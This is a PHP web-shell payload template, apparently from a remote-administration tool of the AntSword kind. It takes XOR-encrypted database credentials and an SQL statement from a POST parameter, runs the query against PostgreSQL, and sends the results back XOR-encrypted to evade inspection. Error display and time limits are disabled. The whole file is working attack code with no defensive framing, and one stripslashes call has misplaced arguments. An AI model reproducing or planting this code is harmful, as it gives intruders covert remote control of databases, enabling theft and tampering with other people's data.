<?php
@ini_set("display_errors", "0");
@set_time_limit(0);
$key = "{KeyString}";

function output($key)
{
    $output = ob_get_contents();
    ob_end_clean();
    echo @base64_xor_encrypt($output, $key);
}

function base64_xor_encrypt($str, $key)
{
    $num = 0;
    $post = $str;
    for ($i = 0; $i < strlen($post); $i++) {
        if ($num >= strlen($key)) {
            $num = $num % strlen($key);
        }
        $post[$i] = $post[$i] ^ $key[$num];
        $num += 1;
    }
    return base64_encode($post);
}

function base64_xor_derypt($str, $key)
{
    $num = 0;
    $post = base64_decode($str);
    for ($i = 0; $i < strlen($post); $i++) {
        if ($num >= strlen($key)) {
            $num = $num % strlen($key);
        }
        $post[$i] = $post[$i] ^ $key[$num];
        $num += 1;
    }
    return $post;
}

ob_start();
try {
    $m = get_magic_quotes_gpc();
    $args = $m ? stripslashes(base64_xor_derypt($_POST[$key]),$key) : base64_xor_derypt($_POST[$key],$key);
    $arg = explode("|",$args);
    $hst = $arg[0];
    $usr = $arg[1];
    $pwd = $arg[2];
    $dbn = $arg[3];
    $sql = base64_decode($arg[4]);
    list($host, $port) = explode(":", $hst);
    $port == "" ? $port = "5432" : $port;
    $arr = array('host' => $host, 'port' => $port, 'user' => $usr, 'password' => $pwd, 'dbname' => $dbn);
    $cs = '';
    foreach ($arr as $k => $v) {
        if (empty($v)) {
            continue;
        }
        $cs .= "{$k}={$v} ";
    }
    $T = @pg_connect($cs);
    if (!$T) {
        echo "ERROR://" . @pg_last_error($T);
    } else {
        $q = @pg_query($T, $sql);
        if (!$q) {
            echo "ERROR://" . @pg_last_error($T);
        } else {
            $n = @pg_num_fields($q);
            if ($n === NULL) {
                echo ("ERROR://" . @pg_last_error($T));
            } elseif ($n === 0) {
                echo "Affect Rows " .@pg_affected_rows($q);
            } else {
                while ($row = @pg_fetch_row($q)) {
                    for ($i = 0; $i < $n; $i++) {
                        echo ($row[$i] !== NULL ? $row[$i] : "NULL");
                    }
                }
            }
            @pg_free_result($q);
        }
        @pg_close($T);
    }
} catch (Exception $e) {
    echo "ERROR://" . $e->getMessage();
}
output($key);
die;